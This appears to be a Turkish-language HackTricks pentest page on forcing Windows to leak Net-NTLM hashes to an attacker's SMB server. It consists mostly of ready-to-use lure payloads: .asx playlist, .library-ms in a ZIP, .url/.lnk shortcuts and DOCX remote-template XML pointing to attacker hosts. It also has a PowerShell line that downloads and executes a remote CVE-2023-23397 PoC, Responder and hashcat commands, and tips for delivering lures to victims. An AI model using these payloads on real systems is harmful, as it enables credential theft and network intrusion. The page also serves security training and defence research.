# NTLM creds çalmak için yerler

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) adresindeki tüm harika fikirleri, çevrimiçi bir Microsoft Word dosyasının indirilmesinden ntlm leaks kaynağına: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md ve [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) adresindeki içeriklere kadar inceleyin**

### Windows Media Player playlists (.ASX/.WAX)

Eğer hedefi kontrolünüzdeki bir Windows Media Player çalma listesini açmaya veya önizlemeye ikna edebilirseniz, girdiyi bir UNC path'e yönlendirerek Net‑NTLMv2'yi leak edebilirsiniz. WMP, referans verilen medyayı SMB üzerinden almaya çalışacak ve otomatik olarak kimlik doğrulaması yapacaktır.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Toplama ve kırma akışı:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP içinde açılan .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, .library-ms dosyalarını ZIP arşivinin içinden doğrudan açıldıklarında güvensiz şekilde işler. Eğer library tanımı uzak bir UNC yoluna işaret ediyorsa (ör. \\attacker\share), ZIP içindeki .library-ms'e sadece göz atmak/başlatmak Explorer'ın UNC'yi listelemesine ve saldırgana NTLM kimlik doğrulaması göndermesine neden olur. Bu, çevrimdışı kırılabilecek veya potansiyel olarak relay edilebilecek bir NetNTLMv2 sağlar.

Saldırgan UNC'ye işaret eden minimal .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasyonel adımlar
- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname'inizi ayarlayın).
- Zip'leyin (Windows'ta: Send to → Compressed (zipped) folder) ve ZIP'i hedefe teslim edin.
- Bir NTLM capture listener çalıştırın ve kurbanın ZIP içinden .library-ms'i açmasını bekleyin.


### Outlook takvim hatırlatıcı ses yolu (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows, takvim öğelerindeki genişletilmiş MAPI özelliği PidLidReminderFileParameter'ı işliyordu. Bu özellik bir UNC yolunu (ör. \\attacker\share\alert.wav) gösteriyorsa, hatırlatıcı tetiklendiğinde Outlook SMB share ile iletişime geçiyor ve kullanıcının Net‑NTLMv2'sini herhangi bir tıklama olmadan leak ediyordu. Bu 14 Mart 2023'te patchlendi, ancak legacy/untouched filolar ve geçmiş olay müdahalesi için hâlâ yüksek derecede alakalı.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener tarafı:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notlar
- Hedefte, hatırlatıcı tetiklendiğinde yalnızca Outlook for Windows'in çalışıyor olması yeterlidir.
- Bu leak, Net‑NTLMv2 üretir ve offline cracking veya relay için uygundur (pass‑the‑hash için değil).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer kısayol simgelerini otomatik olarak render eder. Son araştırmalar, Microsoft’un Nisan 2025 yaması sonrasında bile, kısayol hedefini bir UNC yolunda barındırıp simgeyi yerel tutarak tıklama olmadan NTLM kimlik doğrulamasının tetiklenebileceğini gösterdi (patch bypass assigned CVE‑2025‑50154). Klasöre sadece bakmak, Explorer'ın uzak hedeften metadata almasına ve NTLM'i saldırganın SMB sunucusuna göndermesine yol açar.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Kısayolu payload (.lnk) PowerShell ile:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Dağıtım fikirleri
- Kısayolu bir ZIP içine koyup kurbanın göz atmasını sağla.
- Kısayolu kurbanın açacağı yazılabilir bir share'e yerleştir.
- Aynı klasördeki diğer lure files ile birleştir, böylece Explorer öğeleri önizler.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office belgeleri harici bir şablona referans verebilir. Ekli şablonu bir UNC path'e ayarlarsanız, belge açıldığında SMB'ye kimlik doğrulaması yapılır.

Minimal DOCX relationship changes (inside word/):

1) word/settings.xml dosyasını düzenleyin ve ekli şablon referansını ekleyin:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337'i kendi UNC'nize yönlendirin:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx olarak yeniden paketleyin ve teslim edin. SMB capture listener'ınızı çalıştırın ve açılmasını bekleyin.

Yakalama sonrası relaying veya abusing NTLM fikirleri için bakın:

{{#ref}}
README.md
{{#endref}}


## Referanslar
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
